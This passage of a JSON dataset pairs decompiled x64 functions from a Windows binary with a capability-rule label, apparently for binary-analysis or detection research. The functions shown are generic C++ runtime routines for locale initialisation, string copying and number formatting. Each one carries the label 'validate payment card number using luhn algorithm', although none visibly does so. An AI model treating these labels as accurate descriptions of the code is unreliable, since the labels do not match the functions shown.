        "decompiled_code": "\nint64_t fcn.180077b3c(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289e0;\n    iStackX24 = *0x1801289e0;\n    if (*0x180128930 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128930 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128930 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128930;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128930 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128930 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a0ec(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289e0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 613
    },
    "180077c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077c70(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128988;\n    iStackX24 = *0x180128988;\n    if (*0x1801288e8 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288e8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288e8 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288e8;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288e8 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288e8 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a1c0(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128988 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 619
    },
    "180077da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077da4(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a18;\n    iStackX24 = *0x180128a18;\n    if (*0x180128968 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128968 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128968 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128968;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128968 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128968 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a294(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a18 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 608
    },
    "180077ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180077ed8(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289b8;\n    iStackX24 = *0x1801289b8;\n    if (*0x180128918 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128918 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128918 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128918;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128918 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128918 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a384(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289b8 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 611
    },
    "18007800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18007800c(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x180128a20;\n    iStackX24 = *0x180128a20;\n    if (*0x180128970 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x180128970 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x180128970 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x180128970;\n    iVar3 = *(arg1 + 8);\n    if (*0x180128970 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x180128970 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a474(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x180128a20 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 608
    },
    "18007814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180078140(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iStackX8;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    uchar auStack48 [24];\n    \n    fcn.18006da30(auStackX16, 0);\n    iVar4 = *0x1801289c0;\n    iStackX24 = *0x1801289c0;\n    if (*0x1801288d0 == 0) {\n        fcn.18006da30(&iStackX8, 0);\n        if (*0x1801288d0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801288d0 = *0x1801286b8;\n        }\n        fcn.18006dab0(&iStackX8);\n    }\n    uVar2 = *0x1801288d0;\n    iVar3 = *(arg1 + 8);\n    if (*0x1801288d0 < *(iVar3 + 0x18)) {\n        iVar5 = *(*(iVar3 + 0x10) + *0x1801288d0 * 8);\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (iVar5 == 0) {\n        if (*(iVar3 + 0x24) != '\\0') {\n            iVar3 = fcn.180073b5c();\n            if (uVar2 < *(iVar3 + 0x18)) {\n                iVar5 = *(*(iVar3 + 0x10) + uVar2 * 8);\n            }\n            else {\n                iVar5 = 0;\n            }\n        }\n        if ((iVar5 == 0) && (iVar5 = iVar4,  iVar4 == 0)) {\n            iVar4 = fcn.18007a554(&iStackX24, arg1);\n            iVar5 = iStackX24;\n            if (iVar4 == -1) {\n                fcn.180002310(auStack48);\n                fcn.1800add8c(auStack48, 0x18011f808);\n                pcVar1 = swi(3);\n                iVar4 = (*pcVar1)();\n                return iVar4;\n            }\n            iStackX8 = iStackX24;\n            fcn.180073b24(iStackX24);\n            (**0x1800de8f0)(iVar5);\n            *0x1801289c0 = iVar5;\n        }\n    }\n    fcn.18006dab0(auStackX16);\n    return iVar5;\n}\n",
        "token_count": 622
    },
    "18007886": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180078864(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong arg1_00;\n    uint64_t uVar5;\n    ulong in_R8;\n    ulong in_R9;\n    \n    uVar1 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    uVar5 = 7;\n    if (uVar1 < 8) {\n        uVar2 = *(arg2 + 4);\n        uVar3 = *(arg2 + 1);\n        uVar4 = *(arg2 + 0xc);\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar2;\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xc) = uVar4;\n    }\n    else {\n        uVar5 = uVar1 | 7;\n        if (0x7ffffffffffffffe < uVar5) {\n            uVar5 = 0x7ffffffffffffffe;\n        }\n        arg1_00 = fcn.180082b64(arg1, uVar5 + 1, in_R8, in_R9);\n        *arg1 = arg1_00;\n        fcn.1800ade80(arg1_00, arg2, uVar1 * 2 + 2);\n    }\n    arg1[2] = uVar1;\n    arg1[3] = uVar5;\n    return;\n}\n",
        "token_count": 352
    },
    "18007f53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18007f534(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    ushort *puVar11;\n    char *pcVar12;\n    uint *in_R8;\n    int64_t in_R9;\n    char cVar13;\n    uint64_t unaff_R15;\n    uchar auStack696 [48];\n    ushort uStack648;\n    uint uStack632;\n    uint uStack628;\n    ulong uStack624;\n    int64_t iStack616;\n    uint *puStack608;\n    ulong uStack600;\n    ushort uStack592;\n    unkbyte6 Stack590;\n    uint64_t uStack576;\n    uint64_t uStack568;\n    char cStack560;\n    unkbyte7 Stack559;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint64_t uStack528;\n    uint64_t uStack520;\n    int64_t iStack512;\n    ulong uStack504;\n    ulong uStack496;\n    uchar *puStack488;\n    int64_t iStack480;\n    uchar *puStack472;\n    uchar auStack464 [8];\n    int64_t iStack456;\n    uchar *puStack432;\n    ushort uStack424;\n    uchar uStack416;\n    unkbyte7 Stack415;\n    ushort uStack408;\n    unkbyte6 Stack406;\n    int64_t iStack400;\n    ulong uStack392;\n    uchar auStack384 [48];\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    ulong uStack304;\n    uint uStack296;\n    uint64_t uStack288;\n    uint64_t uStack272;\n    int64_t iStack264;\n    ulong uStack256;\n    ulong uStack248;\n    uchar *puStack240;\n    uchar auStack232 [16];\n    int64_t iStack216;\n    int64_t iStack208;\n    uchar *puStack200;\n    uchar auStack184 [8];\n    ushort uStack176;\n    int64_t iStack168;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    ulong uStack104;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ulong uStack64;\n    uint uStack56;\n    uint64_t uStack48;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ &stack0xffffffffffffff18;\n    uVar9 = in_R8 & 0xff;\n    uStack272 = unaff_R15 & 0xffffffffffffff00 | uVar9;\n    puStack240 = 0x18007f578;\n    iStack264 = fcn.1800bb800(arg1);\n    puStack240 = 0x18007f584;\n    puVar3 = fcn.180074580(&stack0xffffffffffffff68);\n    uStack96 = *puVar3;\n    uStack92 = puVar3[1];\n    uStack88 = puVar3[2];\n    uStack84 = puVar3[3];\n    uStack80 = puVar3[4];\n    uStack76 = puVar3[5];\n    uStack72 = puVar3[6];\n    uStack68 = puVar3[7];\n    uStack64 = *(puVar3 + 8);\n    uStack56 = puVar3[10];\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    puStack240 = 0x18007f5bf;\n    iStack168 = arg1;\n    fcn.180074580(&stack0xffffffffffffff68);\n    cVar13 = uVar9;\n    puVar10 = 0x1800f454f;\n    if (cVar13 == '\\0') {\n        puVar10 = *(iStack264 + 0x10);\n    }\n    iVar7 = -1;\n    do {\n        iStack216 = iVar7;\n        iVar7 = iStack216 + 1;\n    } while (puVar10[iVar7] != '\\0');\n    iStack216 = iStack216 + 2;\n    puStack240 = 0x18007f5f0;\n    iStack480 = iStack216;\n    iVar7 = fcn.1800bb064(iStack216, 1);\n    if (iVar7 != 0) {\n        if (iStack216 != 0) {\n            iVar5 = iVar7 - puVar10;\n            do {\n                puVar10[iVar5] = *puVar10;\n                puVar10 = puVar10 + 1;\n                iStack216 = iStack216 + -1;\n            } while (iStack216 != 0);\n        }\n        *(arg1 + 0x10) = iVar7;\n        puStack240 = 0x18007f62a;\n        uVar4 = fcn.180075da8(\"false\", 0, &stack0xffffffffffffffa0);\n        *(arg1 + 0x20) = uVar4;\n        puStack240 = 0x18007f640;\n        uVar4 = fcn.180075da8(\"true\", 0, &stack0xffffffffffffffa0);\n        *(arg1 + 0x28) = uVar4;\n        if (cVar13 == '\\0') {\n            uStack152 = uStack96;\n            uStack148 = uStack92;\n            uStack144 = uStack88;\n            uStack140 = uStack84;\n            uStack136 = uStack80;\n            uStack132 = uStack76;\n            uStack128 = uStack72;\n            uStack124 = uStack68;\n            uStack120 = uStack64;\n            uStack112 = uStack56;\n            puStack240 = 0x18007f6e0;\n            fcn.180075b58(arg1, 0, iStack264, &stack0xffffffffffffff68);\n        }\n        else {\n            auStack184[0] = 0x2e;\n            uStack176 = 0;\n            iStack168 = 0;\n            puStack200 = &stack0xffffffffffffffa0;\n            puStack240 = 0x18007f673;\n            fcn.18006d768(&stack0xffffffffffffff50, &stack0xffffffffffffff48, 1);\n            *(arg1 + 0x18) = uStack176;\n            auStack184[0] = 0x2c;\n            uStack176 = 0;\n            iStack168 = 0;\n            puStack200 = &stack0xffffffffffffffa0;\n            puStack240 = 0x18007f6a5;\n            fcn.18006d768(&stack0xffffffffffffff50, &stack0xffffffffffffff48, 1);\n            *(arg1 + 0x1a) = uStack176;\n        }\n        puStack240 = 0x18007f6ed;\n        fcn.18008fb00(uStack48 ^ &stack0xffffffffffffff18);\n        return;\n    }\n    puStack240 = 0x18007f713;\n    fcn.18006df20();\n    uStack248 = 0;\n    uStack256 = 1;\n    uStack392 = 0xfffffffffffffffe;\n    uStack288 = *0x180123080 ^ &stack0xfffffffffffffe30;\n    uVar9 = in_R8 & 0xff;\n    uStack520 = unaff_R15 & 0xffffffffffffff00 | uVar9;\n    puStack472 = 0x18007f758;\n    puStack240 = &stack0xffffffffffffffa1;\n    iStack208 = arg1;\n    puStack200 = puVar10;\n    iStack512 = fcn.1800bb800(iStack480);\n    puStack472 = 0x18007f764;\n    puVar3 = fcn.180074580(&stack0xfffffffffffffe80);\n    uStack336 = *puVar3;\n    uStack332 = puVar3[1];\n    uStack328 = puVar3[2];\n    uStack324 = puVar3[3];\n    uStack320 = puVar3[4];\n    uStack316 = puVar3[5];\n    uStack312 = puVar3[6];\n    uStack308 = puVar3[7];\n    uStack304 = *(puVar3 + 8);\n    uStack296 = puVar3[10];\n    *(iStack480 + 0x10) = 0;\n    *(iStack480 + 0x20) = 0;\n    *(iStack480 + 0x28) = 0;\n    puStack472 = 0x18007f79f;\n    iStack400 = iStack480;\n    fcn.180074580(&stack0xfffffffffffffe80);\n    cVar13 = uVar9;\n    puStack488 = 0x1800f454f;\n    if (cVar13 == '\\0') {\n        puStack488 = *(iStack512 + 0x10);\n    }\n    iVar7 = -1;\n    do {\n        iStack456 = iVar7;\n        iVar7 = iStack456 + 1;\n    } while (puStack488[iVar7] != '\\0');\n    iStack456 = iStack456 + 2;\n    puStack472 = 0x18007f7d0;\n    puStack608 = fcn.1800bb064(iStack456, 1);\n    if (puStack608 != NULL) {\n        if (iStack456 != 0) {\n            iVar7 = puStack608 - puStack488;\n            do {\n                puStack488[iVar7] = *puStack488;\n                puStack488 = puStack488 + 1;\n                iStack456 = iStack456 + -1;\n            } while (iStack456 != 0);\n        }\n        *(iStack480 + 0x10) = puStack608;\n        puStack472 = 0x18007f80a;\n        uVar4 = fcn.180075da8(\"false\", 0, &stack0xfffffffffffffeb0);\n        *(iStack480 + 0x20) = uVar4;\n        puStack472 = 0x18007f820;\n        uVar4 = fcn.180075da8(\"true\", 0, &stack0xfffffffffffffeb0);\n        *(iStack480 + 0x28) = uVar4;\n        if (cVar13 == '\\0') {\n            *(iStack480 + 0x18) = **(iStack512 + 0x58);\n            *(iStack480 + 0x1a) = **(iStack512 + 0x60);\n        }\n        else {\n            uStack416 = 0x2e;\n            uStack408 = 0;\n            iStack400 = 0;\n            puStack432 = &stack0xfffffffffffffeb0;\n            puStack472 = 0x18007f853;\n            fcn.18006d768(&stack0xfffffffffffffe68, &stack0xfffffffffffffe60, 1);\n            *(iStack480 + 0x18) = uStack408;\n            uStack416 = 0x2c;\n            uStack408 = 0;\n            iStack400 = 0;\n            puStack432 = &stack0xfffffffffffffeb0;\n            puStack472 = 0x18007f885;\n            fcn.18006d768(&stack0xfffffffffffffe68, &stack0xfffffffffffffe60, 1);\n            *(iStack480 + 0x1a) = uStack408;\n        }\n        puStack472 = 0x18007f8b1;\n        fcn.18008fb00(uStack288 ^ &stack0xfffffffffffffe30);\n        return;\n    }\n    puStack472 = 0x18007f8d7;\n    fcn.18006df20();\n    uStack496 = 0;\n    uStack504 = 1;\n    uStack600 = 0xfffffffffffffffe;\n    uStack528 = *0x180123080 ^ &stack0xfffffffffffffd48;\n    uStack648 = uStack424;\n    pcVar12 = CONCAT71(Stack415, uStack416);\n    uVar9 = CONCAT62(Stack406, uStack408);\n    if ((uVar9 == 0) || (uVar8 = 1,  (*pcVar12 - 0x2bU & 0xfd) != 0)) {\n        uVar8 = 0;\n    }\n    if (((((*(in_R9 + 0x18) & 0xe00) == 0x800) && (uVar8 + 2 <= uVar9)) && (pcVar12[uVar8] == '0')) &&\n       ((pcVar12[uVar8 + 1] + 0xa8U & 0xdf) == 0)) {\n        uVar8 = uVar8 + 2;\n    }\n    iVar7 = *(*(in_R9 + 0x40) + 8);\n    uStack624 = iVar7;\n    iStack616 = in_R9;\n    puStack472 = &stack0xfffffffffffffeb9;\n    (**0x1800de8f0)(iVar7);\n    uVar4 = fcn.180076930(&stack0xfffffffffffffd88);\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7);\n    }\n    uStack576 = 0;\n    uStack568 = 7;\n    uStack592 = 0;\n    if (uVar9 < 8) {\n        uStack576 = uVar9;\n        if (uVar9 != 0) {\n            puVar11 = &stack0xfffffffffffffdb0;\n            for (uVar6 = uVar9; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n        }\n        *(&stack0xfffffffffffffdb0 + uVar9 * 2) = 0;\n    }\n    else {\n        fcn.180075f80(&stack0xfffffffffffffdb0, uVar9);\n    }\n    puVar10 = &stack0xfffffffffffffdb0;\n    if (7 < uStack568) {\n        puVar10 = CONCAT62(Stack590, uStack592);\n    }\n    (**0x1800de8f0)(uVar4, pcVar12, pcVar12 + uVar9, puVar10);\n    iVar7 = *(*(in_R9 + 0x40) + 8);\n    uStack624 = iVar7;\n    (**0x1800de8f0)(iVar7);\n    uVar4 = fcn.180077b3c(&stack0xfffffffffffffd88);\n    iVar5 = 0;\n    if ((iVar7 != 0) && (iVar7 = (**0x1800de8f0)(iVar7),  iVar7 != 0)) {\n        (**0x1800de8f0)(iVar7, 1);\n    }\n    (**0x1800de8f0)(uVar4, &stack0xfffffffffffffdd0);\n    pcVar12 = &stack0xfffffffffffffdd0;\n    if (0xf < CONCAT44(uStack532, uStack536)) {\n        pcVar12 = CONCAT71(Stack559, cStack560);\n    }\n    if (*pcVar12 - 1U < 0x7e) {\n        (**0x1800de8f0)();\n        while (((cVar13 = *pcVar12,  cVar13 != '\\x7f' && ('\\0' < cVar13)) && (cVar13 < uVar9 - uVar8))) {\n            uVar9 = uVar9 - cVar13;\n            fcn.1800891dc(&stack0xfffffffffffffdb0, uVar9, 1);\n            if ('\\0' < pcVar12[1]) {\n                pcVar12 = pcVar12 + 1;\n            }\n        }\n    }\n    uVar6 = uStack576;\n    uVar9 = *(in_R9 + 0x28);\n    iVar7 = iVar5;\n    if ((0 < uVar9) && (uStack576 < uVar9)) {\n        iVar7 = uVar9 - uStack576;\n    }\n    uVar2 = *(in_R9 + 0x18) & 0x1c0;\n    uStack632 = *in_R8;\n    uStack628 = in_R8[1];\n    uStack624._0_4_ = in_R8[2];\n    uStack624._4_4_ = in_R8[3];\n    uVar9 = uVar8;\n    if (uVar2 == 0x40) {\n        for (; uVar9 != 0; uVar9 = uVar9 - 1) {\n            fcn.180078370(&stack0xfffffffffffffd88);\n            in_R9 = iStack616;\n        }\n    }\n    else if (uVar2 == 0x100) {\n        for (; uVar9 != 0; uVar9 = uVar9 - 1) {\n            fcn.180078370(&stack0xfffffffffffffd88);\n            in_R9 = iStack616;\n        }\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&stack0xfffffffffffffd88);\n        }\n        iVar7 = 0;\n    }\n    else {\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            fcn.180078370(&stack0xfffffffffffffd88);\n        }\n        for (; iVar7 = iVar5,  uVar9 != 0; uVar9 = uVar9 - 1) {\n            fcn.180078370(&stack0xfffffffffffffd88);\n            in_R9 = iStack616;\n        }\n    }\n    *in_R8 = uStack632;\n    in_R8[1] = uStack628;\n    in_R8[2] = uStack624;\n    in_R8[3] = uStack624._4_4_;\n    for (iVar5 = uVar6 - uVar8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        fcn.180078370(&stack0xfffffffffffffd88);\n        in_R9 = iStack616;\n    }\n    *(in_R9 + 0x28) = 0;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        fcn.180078370(&stack0xfffffffffffffd88);\n    }\n    *puStack608 = uStack632;\n    puStack608[1] = uStack628;\n    puStack608[2] = uStack624;\n    puStack608[3] = uStack624._4_4_;\n    uVar9 = CONCAT44(uStack532, uStack536);\n    if (0xf < uVar9) {\n        iVar5 = CONCAT71(Stack559, cStack560);\n        iVar7 = iVar5;\n        if (0xfff < uVar9 + 1) {\n            iVar7 = *(iVar5 + -8);\n            if (0x1f < (iVar5 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, uVar9 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    uStack544 = *0x180101910;\n    uStack540 = *0x180101914;\n    uStack536 = *0x180101918;\n    uStack532 = *0x18010191c;\n    cStack560 = '\\0';\n    fcn.180003e40(&stack0xfffffffffffffdb0);\n    fcn.18008fb00(uStack528 ^ &stack0xfffffffffffffd48);\n    return;\n}\n",
        "token_count": 4609
    },
    "18007f71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18007f714(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    ushort *puVar10;\n    char *pcVar11;\n    uint *in_R8;\n    int64_t in_R9;\n    uchar *puVar12;\n    char cVar13;\n    uint64_t unaff_R15;\n    uchar auStack464 [48];\n    ushort uStack416;\n    uint uStack400;\n    uint uStack396;\n    ulong uStack392;\n    int64_t iStack384;\n    uint *puStack376;\n    ulong uStack368;\n    ushort uStack360;\n    unkbyte6 Stack358;\n    uint64_t uStack344;\n    uint64_t uStack336;\n    char cStack328;\n    unkbyte7 Stack327;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint64_t uStack296;\n    uint64_t uStack288;\n    int64_t iStack280;\n    ulong uStack272;\n    ulong uStack264;\n    uchar *puStack256;\n    int64_t iStack248;\n    uchar *puStack240;\n    uchar auStack232 [8];\n    int64_t iStack224;\n    uchar *puStack200;\n    ushort uStack192;\n    uchar uStack184;\n    unkbyte7 Stack183;\n    ushort uStack176;\n    unkbyte6 Stack174;\n    int64_t iStack168;\n    ulong uStack160;\n    uchar auStack152 [48];\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    ulong uStack72;\n    uint uStack64;\n    uint64_t uStack56;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ &stack0xffffffffffffff18;\n    uVar8 = in_R8 & 0xff;\n    uStack288 = unaff_R15 & 0xffffffffffffff00 | uVar8;\n    puStack240 = 0x18007f758;\n    iStack280 = fcn.1800bb800(arg1);\n    puStack240 = 0x18007f764;\n    puVar3 = fcn.180074580(&stack0xffffffffffffff68);\n    uStack104 = *puVar3;\n    uStack100 = puVar3[1];\n    uStack96 = puVar3[2];\n    uStack92 = puVar3[3];\n    uStack88 = puVar3[4];\n    uStack84 = puVar3[5];\n    uStack80 = puVar3[6];\n   